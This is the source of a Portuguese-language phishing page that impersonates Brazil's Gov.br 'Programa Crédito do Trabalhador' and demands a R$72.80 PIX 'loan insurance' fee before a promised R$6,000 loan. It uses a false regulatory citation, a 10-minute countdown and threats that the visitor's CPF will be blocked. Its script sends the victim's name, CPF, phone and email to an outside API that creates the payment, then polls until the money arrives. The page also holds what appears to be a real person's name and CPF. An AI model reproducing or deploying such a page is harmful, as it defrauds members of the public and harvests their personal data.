<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <script type="text/javascript">
      (function (c, l, a, r, i, t, y) {
        c[a] =
          c[a] ||
          function () {
            (c[a].q = c[a].q || []).push(arguments);
          };
        t = l.createElement(r);
        t.async = 1;
        t.src = "https://www.clarity.ms/tag/" + i;
        y = l.getElementsByTagName(r)[0];
        y.parentNode.insertBefore(t, y);
      })(window, document, "clarity", "script", "qs9me5web3");
    </script>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta
      http-equiv="Cache-Control"
      content="no-store, no-cache, must-revalidate"
    />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <title>PROGRAMA CRÉDITO DO TRABALHADOR - SEGURO</title>
    <link href="css/all.min.css" rel="stylesheet" />
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      @font-face {
        font-family: "Rawline";
        src: url("fonts/rawline-400.ea42a37247439622.woff2") format("woff2");
        font-weight: 400;
        font-style: normal;
      }
      @font-face {
        font-family: "Rawline";
        src: url("fonts/rawline-400i.1701033bc0b08320.woff2") format("woff2");
        font-weight: 400;
        font-style: italic;
      }
      @font-face {
        font-family: "Rawline";
        src: url("fonts/rawline-500.f8af4ec801afaa28.woff2") format("woff2");
        font-weight: 500;
        font-style: normal;
      }
      @font-face {
        font-family: "Rawline";
        src: url("fonts/rawline-600.844a17f0db94d147.woff2") format("woff2");
        font-weight: 600;
        font-style: normal;
      }
      @font-face {
        font-family: "Rawline";
        src: url("fonts/rawline-700.1c7c76152b40409f.woff2") format("woff2");
        font-weight: 700;
        font-style: normal;
      }
      @font-face {
        font-family: "Rawline";
        src: url("fonts/rawline-800.5c5f78761d00551b.woff2") format("woff2");
        font-weight: 800;
        font-style: normal;
      }
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Rawline", sans-serif;
      }
      body {
        background-color: white;
        margin-top: 0;
        padding-top: 100px;
        font-family: "Rawline", sans-serif;
        max-width: 100%;
        overflow-x: hidden;
      }
      .header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 8px 20px;
        background-color: white;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        z-index: 1000;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        height: 60px;
      }
      .logo {
        height: 35px;
      }
      .header-icons {
        display: flex;
        align-items: center;
      }
      .header-icon {
        font-size: 18px;
        color: #1351b4;
        margin-left: 15px;
        cursor: pointer;
      }
      .container {
        max-width: 800px;
        margin: 20px auto;
        padding: 0 20px;
      }
      .alert-box {
        background-color: #fabc14;
        color: #333;
        padding: 1.2rem;
        border-radius: 8px;
        margin-bottom: 1.5rem;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      }
      .alert-title {
        display: flex;
        align-items: center;
        font-weight: 700;
        margin-bottom: 0.8rem;
        font-size: 1.1rem;
      }
      .alert-title i {
        color: #d61600;
        margin-right: 8px;
        font-size: 1.2rem;
      }
      .alert-title span {
        color: #000;
      }
      .payment-card {
        background-color: #1451b4;
        color: white;
        border-radius: 8px;
        padding: 1.5rem;
        margin-bottom: 1.5rem;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
      }
      .payment-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 1.5rem;
        padding-bottom: 0.8rem;
        border-bottom: 1px solid rgba(255, 255, 255, 0.2);
      }
      .payment-header span {
        font-weight: 700;
        font-size: 1.3rem;
        text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
      }
      .payment-header span i {
        margin-right: 8px;
      }
      .user-info-content {
        margin-top: 1rem;
        padding: 1rem;
        background-color: rgba(255, 255, 255, 0.1);
        border-radius: 5px;
      }
      .user-info-item {
        display: flex;
        margin-bottom: 0.6rem;
      }
      .user-info-label {
        color: rgba(255, 255, 255, 0.7);
        width: 160px;
        flex-shrink: 0;
      }
      .user-info-value {
        color: white;
        font-weight: 600;
        flex-grow: 1;
      }
      .qr-container {
        background-color: white;
        padding: 1.5rem;
        border-radius: 8px;
        text-align: center;
        margin-top: 1.5rem;
      }
      .qr-code {
        width: 220px;
        height: 220px;
        margin: 1rem auto;
        background: #f8f9fa;
        padding: 10px;
        border-radius: 4px;
      }
      .pix-code {
        background: #f8f9fa;
        padding: 15px;
        border-radius: 4px;
        margin: 1rem 0;
        font-family: monospace;
        word-break: break-all;
        border: 1px dashed #dee2e6;
      }
      .copy-button {
        width: 100%;
        padding: 12px;
        background-color: #1351b4;
        color: white;
        border: none;
        border-radius: 4px;
        font-weight: 600;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        margin: 1rem 0;
        transition: all 0.3s ease;
      }
      .copy-button:hover,
      .copy-button:active {
        background-color: #092555;
      }
      .timer-container {
        background: #f8d7da;
        border: 1px solid #f5c6cb;
        color: #721c24;
        padding: 1.2rem;
        border-radius: 8px;
        text-align: center;
        margin: 1.5rem 0;
        animation: pulse 2s infinite;
      }
      .timer {
        font-size: 36px;
        font-weight: 700;
        color: #dc3545;
        margin: 15px 0;
        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
      }
      .warning-text {
        font-weight: 600;
        margin-top: 10px;
        line-height: 1.4;
      }
      @keyframes pulse {
        0% {
          box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4);
        }
        70% {
          box-shadow: 0 0 0 10px rgba(220, 53, 69, 0);
        }
        100% {
          box-shadow: 0 0 0 0 rgba(220, 53, 69, 0);
        }
      }
      .loading {
        display: none;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        margin: 2rem 0;
      }
      .spinner {
        width: 50px;
        height: 50px;
        border: 5px solid rgba(0, 0, 0, 0.1);
        border-top-color: #1351b4;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin-bottom: 1rem;
      }
      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
      .loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: white;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 9999;
      }
      .loading-spinner {
        width: 50px;
        height: 50px;
        border: 4px solid #f3f3f3;
        border-top: 4px solid #0c326f;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin-bottom: 20px;
      }
      .content {
        display: none;
      }
      .footer {
        background-color: #071d41;
        color: white;
        padding: 1.5rem;
        text-align: center;
        margin-top: 2rem;
      }
      .footer-logo {
        width: 100px;
        margin: 0 auto 0.8rem;
      }
    </style>
  </head>
  <body>
    <!-- Header -->
    <div class="header">
      <img alt="Logo Gov.br" class="logo" src="images/govbr-colorido-b.png" />
      <div class="header-icons">
        <i class="fas fa-search header-icon"></i>
        <i class="fas fa-question-circle header-icon"></i>
        <i class="fas fa-adjust header-icon"></i>
      </div>
    </div>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
      <div class="loading-spinner"></div>
      <p style="font-size: 18px; color: #333">Gerando transação PIX...</p>
    </div>

    <!-- Main Content (initially hidden) -->
    <div class="content" id="mainContent">
      <div class="container">
        <div class="alert-box">
          <div
            class="alert-title"
            style="color: #000000; text-align: center; justify-content: center"
          >
            <i class="fas fa-exclamation-triangle" style="color: #000000"></i>
            <span>ATENÇÃO</span>
          </div>
          <p>
            Para <strong>liberar o empréstimo</strong>, é necessário efetuar o
            pagamento do <strong>seguro prestamista</strong> conforme
            determinação do
            <strong>Conselho Monetário Nacional</strong> (Resolução Nº 3.308 do
            BCB).
          </p>

          <div style="margin: 15px 0; text-align: center">
            <p style="font-weight: 700; font-size: 16px; margin-bottom: 5px">
              TEMPO RESTANTE
            </p>
            <div
              class="timer"
              id="timer"
              style="
                font-size: 32px;
                font-weight: 700;
                color: #d61600;
                margin: 0 auto;
              "
            >
              10:00
            </div>
          </div>

          <p style="margin-top: 10px; font-weight: 500">
            Se o pagamento do seguro não for realizado em até
            <strong>10 minutos</strong>, seu empréstimo será
            <strong>CANCELADO definitivamente</strong>. O benefício será
            repassado para outro cidadão e você perderá o direito ao empréstimo
            do Programa Crédito do Trabalhador.
          </p>
        </div>

        <div class="payment-card">
          <div class="payment-header">
            <span><i class="fas fa-shield-alt"></i> SEGURO PRESTAMISTA</span>
          </div>

          <!-- Dados do Pagamento -->
          <div
            class="user-info-content"
            style="
              margin-top: 1rem;
              padding: 1rem;
              background-color: rgba(255, 255, 255, 0.1);
              border-radius: 5px;
            "
          >
            <div style="color: rgba(255, 255, 255, 0.7); margin-bottom: 5px">
              Nome:
            </div>
            <div
              style="color: white; font-weight: 600; margin-bottom: 15px"
              id="customerName"
            >
              <!-- Nome será preenchido via JavaScript -->
            </div>

            <div style="color: rgba(255, 255, 255, 0.7); margin-bottom: 5px">
              CPF:
            </div>
            <div
              style="color: white; font-weight: 600; margin-bottom: 15px"
              id="customerCpf"
            >
              <!-- CPF será preenchido via JavaScript -->
            </div>

            <div style="color: rgba(255, 255, 255, 0.7); margin-bottom: 5px">
              Valor do Seguro:
            </div>
            <div
              style="color: white; font-weight: 600; margin-bottom: 5px"
              id="insuranceAmount"
            >
              R$ 72,80
            </div>
          </div>

          <p style="margin-top: 1.5rem; font-weight: 600; font-size: 1.1rem">
            Este valor será devolvido após o término do seu contrato de
            empréstimo (36 meses).
          </p>
        </div>

        <div
          class="qr-container"
          style="
            text-align: left;
            background-color: white;
            padding: 1.5rem;
            border-radius: 8px;
            margin-top: 1.5rem;
            width: 100%;
            max-width: 800px;
            margin-left: auto;
            margin-right: auto;
          "
        >
          <h3
            style="
              font-weight: 700;
              font-size: 1.2rem;
              color: #1351b4;
              margin-bottom: 20px;
              text-align: center;
            "
          >
            INFORMAÇÕES DO EMPRÉSTIMO
          </h3>

          <div
            style="
              background-color: #f5f8ff;
              padding: 20px;
              border-radius: 8px;
              border: 1px solid #ddd;
              margin-bottom: 20px;
            "
          >
            <div style="margin-bottom: 15px">
              <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px">
                Valor do Empréstimo:
              </div>
              <div
                style="font-size: 1.2rem; font-weight: 700; color: #28a745"
                id="loanAmountText"
              >
                R$ 6.000,00
              </div>
            </div>

            <div style="margin-bottom: 15px">
              <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px">
                Dados Bancários:
              </div>
              <div style="font-size: 1rem">
                <div style="margin-bottom: 5px">
                  <strong>Banco:</strong>
                  <span id="selectedBank">CAIXA ECONÔMICA FEDERAL</span>
                </div>
                <div style="margin-bottom: 5px">
                  <strong>Chave PIX:</strong>
                  <span id="pixKeyText">(61) 98213-2603</span>
                </div>
                <div>
                  <strong>Tipo de Chave:</strong>
                  <span id="pixKeyTypeText">Telefone</span>
                </div>
              </div>
            </div>

            <div>
              <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px">
                Prazo:
              </div>
              <div style="font-size: 1rem">
                O valor será depositado em sua conta após a confirmação do
                pagamento do seguro prestamista.
              </div>
            </div>
          </div>

          <div
            style="
              background-color: #fef9e7;
              padding: 15px;
              border-radius: 8px;
              border-left: 4px solid #f39c12;
            "
          >
            <div
              style="display: flex; align-items: center; margin-bottom: 10px"
            >
              <i
                class="fas fa-info-circle"
                style="color: #f39c12; font-size: 1.2rem; margin-right: 10px"
              ></i>
              <div style="font-weight: 600; color: #f39c12">Importante:</div>
            </div>
            <p style="margin: 0; line-height: 1.4">
              Após o pagamento do seguro, o valor de
              <strong id="loanAmountText2">R$ 6.000,00</strong> será depositado
              em até <strong>5 minutos</strong> na conta vinculada ao CPF
              <strong id="userCpfText">431.366.038-00</strong>.
            </p>
          </div>

          <script>
            document.addEventListener("DOMContentLoaded", function () {
              // Obter dados do cliente da URL ou localStorage
              const urlParams = new URLSearchParams(window.location.search);

              // Buscar dos parâmetros da URL primeiro (prioridade)
              let customerName = urlParams.get("nome") || "";
              let customerCpf = urlParams.get("cpf") || "";
              let customerPhone = urlParams.get("phone") || "";
              let pixKey = urlParams.get("pix_key") || "";
              let selectedBank = urlParams.get("bank") || "Banco não informado";
              let loanAmount = urlParams.get("amount") || "0";

              // Se não encontrar na URL, tentar buscar do localStorage
              if (!customerName || !customerCpf) {
                try {
                  const savedCustomerData = JSON.parse(
                    localStorage.getItem("customerData") || "{}"
                  );
                  customerName =
                    customerName ||
                    savedCustomerData.nome ||
                    "Nome não informado";
                  customerCpf =
                    customerCpf || savedCustomerData.cpf || "CPF não informado";
                  customerPhone =
                    customerPhone || savedCustomerData.phone || "";
                  pixKey = pixKey || savedCustomerData.pix_key || "";
                  selectedBank =
                    selectedBank ||
                    savedCustomerData.bank ||
                    "Banco não informado";
                  loanAmount = loanAmount || savedCustomerData.amount || "0";
                } catch (e) {
                  console.error("Erro ao recuperar dados do localStorage:", e);
                }
              }

              // Formatar CPF se existir
              const formattedCpf = customerCpf
                ? formatCpf(customerCpf)
                : "CPF não informado";

              // Atualizar os elementos HTML
              document.getElementById("customerName").textContent =
                customerName;
              document.getElementById("customerCpf").textContent = formattedCpf;

              // Salvar dados para uso em outras páginas
              if (customerName && customerCpf) {
                localStorage.setItem(
                  "customerData",
                  JSON.stringify({
                    nome: customerName,
                    cpf: customerCpf,
                    phone: customerPhone,
                    bank: selectedBank,
                    pix_key: pixKey,
                    amount: loanAmount,
                  })
                );
              }
            });

            // Função para formatar CPF
            function formatCpf(cpf) {
              cpf = cpf.replace(/\D/g, "");
              if (cpf.length !== 11) return cpf;
              return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
            }
          </script>
        </div>

        <div
          style="
            margin: 20px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
          "
        >
          <div
            style="display: flex; justify-content: center; margin-bottom: 20px"
          >
            <div style="text-align: center">
              <p
                style="
                  margin-bottom: 15px;
                  font-weight: 600;
                  color: #1351b4;
                  text-align: center;
                "
              >
                QR Code PIX
              </p>
              <img
                id="pixQrCode"
                src="data:image/png;base64,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"
                alt="QR Code PIX"
                style="
                  width: 200px;
                  height: 200px;
                  border: 1px solid #ddd;
                  border-radius: 8px;
                  padding: 10px;
                  background: white;
                  margin: 0 auto 20px;
                "
              />
            </div>
          </div>

          <p
            style="
              margin-bottom: 15px;
              font-weight: 600;
              color: #1351b4;
              text-align: center;
            "
          >
            Ou copie o código PIX
          </p>

          <div style="width: 100%; max-width: 600px; margin: 0 auto">
            <div
              id="pixCode"
              class="pix-code"
              style="
                word-break: break-all;
                font-size: 14px;
                background-color: #f5f5f5;
                padding: 15px;
                border-radius: 8px;
                border: 1px solid #ddd;
                margin-bottom: 15px;
                max-height: 100px;
                overflow-y: auto;
              "
            >
              00020126870014br.gov.bcb.pix2565pix.primepag.com.br/qr/v3/at/5c90a499-8579-4fa8-b7e2-68c29ed0a3725204000053039865802BR5925PAGAMENTO
              SEGURO INTERMED6006SOBRAL62070503***63042D9D
            </div>

            <button
              onclick="copyPixCode()"
              class="copy-button"
              style="
                background-color: #4fb04b;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 10px 15px;
                font-weight: 600;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto;
                transition: all 0.3s ease;
              "
            >
              <i class="fas fa-copy" style="margin-right: 8px"></i>
              Copiar código PIX
            </button>
          </div>

          <div
            style="
              margin-top: 40px;
              background-color: #f9f9f9;
              border-radius: 8px;
              border: 1px solid #e0e0e0;
              padding: 20px;
              max-width: 600px;
              margin-left: auto;
              margin-right: auto;
            "
          >
            <h3
              style="
                color: #1351b4;
                text-align: center;
                margin-bottom: 15px;
                font-size: 1.1rem;
              "
            >
              COMO PAGAR COM PIX COPIA E COLA
            </h3>
            <ol style="padding-left: 20px; margin-bottom: 0">
              <li style="margin-bottom: 10px; line-height: 1.4">
                Abra o aplicativo do seu banco ou instituição financeira
              </li>
              <li style="margin-bottom: 10px; line-height: 1.4">
                Acesse a área PIX do aplicativo
              </li>
              <li style="margin-bottom: 10px; line-height: 1.4">
                Selecione a opção "PIX Copia e Cola" ou "Pix QR Code"
              </li>
              <li style="margin-bottom: 10px; line-height: 1.4">
                Cole o código PIX que você copiou acima
              </li>
              <li style="margin-bottom: 10px; line-height: 1.4">
                Finalize o pagamento conforme instruções do seu banco
              </li>
              <li style="margin-bottom: 0; line-height: 1.4">
                O pagamento será processado e seu empréstimo será liberado
                automaticamente
              </li>
            </ol>
          </div>

          <script>
            document.addEventListener("DOMContentLoaded", function () {
              let transactionId = "";
              let checkInterval;

              // Obter dados do cliente do localStorage ou URL params
              const urlParams = new URLSearchParams(window.location.search);
              const customerData = JSON.parse(
                localStorage.getItem("customerData") || "{}"
              );

              // Recuperar parâmetros de URL salvos anteriormente
              const savedUrlParams = JSON.parse(
                localStorage.getItem("urlParameters") || "{}"
              );

              const customer = {
                name:
                  customerData.nome ||
                  urlParams.get("nome") ||
                  "JUAN VENANCIO DA SILVA MARTINS",
                document:
                  customerData.cpf || urlParams.get("cpf") || "431.366.038-00",
                phone: customerData.phone || urlParams.get("phone") || "",
                email:
                  customerData.email ||
                  urlParams.get("email") ||
                  "cliente@exemplo.com",
              };

              // Gerar o código PIX utilizando a API
              async function generatePixCode() {
                try {
                  // Recuperar parâmetros UTM do localStorage
                  const savedParams = JSON.parse(
                    localStorage.getItem("urlParameters") || "{}"
                  );

                  // Verificar se o objeto está vazio
                  const isEmptyObject = Object.keys(savedParams).length === 0;

                  // Construir a string UTM
                  const utmParams = isEmptyObject
                    ? { utm_source: "direct" }
                    : {
                        utm_source: savedParams.utm_source || "",
                        utm_campaign: savedParams.utm_campaign || "",
                        utm_medium: savedParams.utm_medium || "",
                        utm_content: savedParams.utm_content || "",
                        utm_term: savedParams.utm_term || "",
                      };

                  // Converter os parâmetros UTM em string de consulta
                  const utmString = isEmptyObject
                    ? "utm_source=direct"
                    : Object.entries(utmParams)
                        .filter(([_, value]) => value) // Remove parâmetros vazios
                        .map(
                          ([key, value]) =>
                            `${key}=${encodeURIComponent(value)}`
                        )
                        .join("&");

                  // Preparar objeto para API PIX incluindo parâmetros UTM salvos
                  const pixRequestData = {
                    amount: 7280, // Valor em centavos (72.8 * 100 = 7280)
                    description: "Seguro",
                    customer: {
                      name: customer.name,
                      document: customer.document.replace(/[^\d]/g, ""),
                      phone: customer.phone,
                      email: customer.email,
                    },
                    item: {
                      title: "Seguro",
                      price: 500, // Valor em centavos
                      quantity: 1,
                    },
                    // Passar UTMs como string
                    utm: utmString,
                  };

                  console.log("Solicitação para API PIX:", pixRequestData);

                  const response = await fetch(
                    "https://api-production-0feb.up.railway.app/g5",
                    {
                      method: "POST",
                      headers: {
                        "Content-Type": "application/json",
                      },
                      body: JSON.stringify(pixRequestData),
                    }
                  );

                  if (!response.ok) {
                    throw new Error("Falha ao gerar o código PIX");
                  }

                  const data = await response.json();
                  console.log("Resposta da API PIX:", data);

                  // Atualizar o UI com o código PIX recebido
                  if (data.pixCode) {
                    document.getElementById("pixCode").textContent =
                      data.pixCode;
                    transactionId = data.transactionId;

                    // Gerar QR Code utilizando a API QR Server
                    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(
                      data.pixCode
                    )}&size=240x240`;
                    document.getElementById("pixQrCode").src = qrCodeUrl;
                    console.log("QR Code gerado:", qrCodeUrl);

                    // Iniciar a verificação de status
                    checkInterval = setInterval(checkPaymentStatus, 3000);
                  } else {
                    throw new Error("Código PIX não recebido");
                  }
                } catch (error) {
                  console.error("Erro ao gerar código PIX:", error);
                  // Usar o fallback em caso de erro
                  document.getElementById("pixCode").textContent =
                    fallbackPixCode;
                  document.getElementById("pixQrCode").src = fallbackQrCode;
                } finally {
                  // Ocultar a tela de carregamento
                  document.getElementById("loadingScreen").style.display =
                    "none";
                  document.getElementById("mainContent").style.display =
                    "block";
                }
              }

              // Verificar o status do pagamento
              async function checkPaymentStatus() {
                if (!transactionId) return;

                try {
                  const response = await fetch(
                    "https://api-production-0feb.up.railway.app/verify5",
                    {
                      method: "POST",
                      headers: {
                        "Content-Type": "application/json",
                      },
                      body: JSON.stringify({
                        paymentId: transactionId,
                      }),
                    }
                  );

                  if (!response.ok) {
                    throw new Error("Falha ao verificar status do pagamento");
                  }

                  const data = await response.json();
                  console.log("Status do pagamento:", data);

                  // Verificar se o pagamento foi concluído
                  if (
                    data.ok &&
                    (data.status === "completed" ||
                      (data.data &&
                        data.data.payment &&
                        data.data.payment.status === "completed"))
                  ) {
                    // Pagamento confirmado
                    clearInterval(checkInterval);
                    clearInterval(countdown);

                    // Armazenar dados do usuário
                    localStorage.setItem("userData", JSON.stringify(customer));

                    // Armazenar informações da transação sem os parâmetros UTM
                    const transactionData = {
                      transactionId: transactionId,
                      amount: amount,
                      timestamp: new Date().toISOString(),
                      customer: {
                        name: customer.name,
                        document: customer.document,
                      },
                      paymentStatus: data.status || "completed",
                    };

                    localStorage.setItem(
                      "lastTransaction",
                      JSON.stringify(transactionData)
                    );
                    console.log(
                      "Transação concluída e salva:",
                      transactionData
                    );

                    // Redirecionar para página de agradecimento
                    window.location.replace("../obrigado/index.html");
                  }
                } catch (error) {
                  console.error(
                    "Erro ao verificar status do pagamento:",
                    error
                  );
                }
              }

              // Timer functionality
              let timeLeft = 10 * 60; // 10 minutes in seconds
              const timerDisplay = document.getElementById("timer");

              const countdown = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                timerDisplay.textContent = `${minutes
                  .toString()
                  .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;

                if (timeLeft <= 0) {
                  clearInterval(countdown);
                  clearInterval(checkInterval);
                  timerDisplay.textContent = "00:00";
                  alert(
                    "Tempo expirado! Seu CPF foi bloqueado para operações PIX."
                  );
                  window.location.href = "/";
                }
                timeLeft--;
              }, 1000);

              // Iniciar a geração do código PIX
              generatePixCode();

              // Copy PIX code functionality
              window.copyPixCode = function () {
                const pixCode = document
                  .getElementById("pixCode")
                  .textContent.trim();
                const copyButton = document.querySelector(".copy-button");

                navigator.clipboard.writeText(pixCode).then(
                  function () {
                    copyButton.innerHTML =
                      '<i class="fas fa-check"></i> Código Copiado!';
                    copyButton.style.backgroundColor = "#28a745";
                    setTimeout(() => {
                      copyButton.innerHTML =
                        '<i class="fas fa-copy"></i> Copiar código PIX';
                      copyButton.style.backgroundColor = "#4FB04B";
                    }, 2000);
                  },
                  function (err) {
                    console.error("Erro ao copiar:", err);
                    copyButton.innerHTML =
                      '<i class="fas fa-times"></i> Erro ao copiar';
                    copyButton.style.backgroundColor = "#dc3545";
                  }
                );
              };
            });
          </script>
        </div>
      </div>
    </div>

    <!-- Footer -->
    <footer class="footer">
      <p>© Todos os direitos reservados.</p>
    </footer>
  </body>
</html>
